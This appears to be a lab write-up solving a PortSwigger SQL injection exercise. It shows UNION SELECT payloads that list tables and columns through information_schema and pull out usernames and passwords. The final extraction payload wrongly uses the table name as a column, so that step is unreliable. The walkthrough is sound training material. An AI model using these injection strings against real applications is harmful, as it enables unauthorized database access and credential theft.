# SQL injection attack, listing the database contents on non-Oracle databases
**Title:**  SQL injection attack, listing the database contents on non-Oracle databases. [Go](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
**Description:** This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

## Preface

Most database types (with the notable exception of Oracle) have a set of views called the information schema which provide information about the database.

You can query  `information_schema.tables`  to list the tables in the database:

`SELECT * FROM information_schema.tables`

This returns output like the following:

TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | TABLE_TYPE
-------- | ----- | ------------ | ---------
MyDatabase | dbo | Products | BASE TABLE
MyDatabase | dbo | Users | BASE TABLE
MyDatabase | dbo | Feedback | BASE TABLE

This output indicates that there are three tables, called  `Products`,  `Users`, and  `Feedback`.

You can then query  `information_schema.columns`  to list the columns in individual tables:

`SELECT * FROM information_schema.columns WHERE table_name = 'Users'`

This returns output like the following:

TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | DATA_TYPE
-------- | ----- | ------------ | --------- | ---------
MyDatabase | dbo | Users | UserId | int
MyDatabase | dbo | Users | Username | varchar
MyDatabase | dbo | Users | Password | varchar

This output shows the columns in the specified table and the data type of each column.

## Methodology

### Finding the vulnerable parameter
Initially, our foremost objective is to identify a potential vulnerability within the application's parameters that allows for the execution of SQL queries. Notably, in the context of this shopping application, we are particularly interested in the product category functionality, where the backend logic is designed to query the submitted data.

### My thought
As we all know for a  `UNION`  query to work, two key requirements must be met:

_The individual queries must return the same number of columns._
_The data types in each column must be compatible between the individual queries._
Determining __number of columns present in the database table.__ Here we will use `ORDER BY` clause. After invoking `' ORDER BY 3#` we got `Internal Server Error`. That means this database has two columns.

![poc_listing_db_content_non_oracle_db.png](../images/listing_db_content_non_oracle_db.png)

Finding _column with string datatype._ After invoking `' UNION SELECT 'a','a'#` we got no error. Means both column is string datatype.

![poc_listing_db_content_string.png](../images/listing_db_content_string.png)

![poc_listing_db_content_string_01.png](../images/listing_db_content_string_01.png)

**Tip:** As you can see from this lab, there is _product name_ with their _description_ and both are string data type. This is a strong indication that the table has two columns & both of which are string data types.

### Payload
At first enumerate table name using `information_schema`. `' UNION SELECT table_name, NULL FROM information_schema.tables--` helps us with this. 

![pc_listing_db_content_table_names.png](../images/listing_db_content_table_names.png)

 Now find out the number of columns in this table. `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_gkzlgj'--` helps us with this.

 ![poc_listing_db_content_username_password_column.png](../images/listing_db_content_username_password_column.png)
 
And at last enumerate the content in these two columns. `' UNION SELECT users_gkzlgj, password_zvekho FROM users_gkzlgj--` helps us with this.
 
![poc_listing_db_content_username_password.png](../images/listing_db_content_username_password.png)

**Understanding the Logic:**

1. Data Schema Analysis

Initiate the reconnaissance process by first determining the number of columns in the database and their respective data types. This critical step lays the foundation for further investigation.

2. Table Enumeration

Employ the `' UNION SELECT table_name, NULL FROM information_schema.tables--` query to systematically retrieve a comprehensive list of all tables within the database. This meticulous process allows us to identify the specific table of interest, namely `users_gkzlgj`.

3. Column Enumeration

Once the target table `users_gkzlgj` has been identified, proceed to enumerate its column names. Utilize the query `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_gkzlgj'--` to meticulously gather information about the structure of this table.

4. Data Extraction

Conclude the enumeration process by extracting the contents of the `users_gkzlgj` table. Employ the query `' UNION SELECT users_gkzlgj, password_zvekho FROM users_gkzlgj--` to obtain the specific data of interest, including usernames and corresponding password hashes.

 **Note:** Notice that in the process of solving the lab we didn’t confirm where the vulnerability exists or not. As from the lab description we know the _product category filter_ parameter is vulnerable to SQL injection. We did not do any confirmation test or something like that. But in a real world scenario you have to first confirm the vulnerability then go for further exploitation.
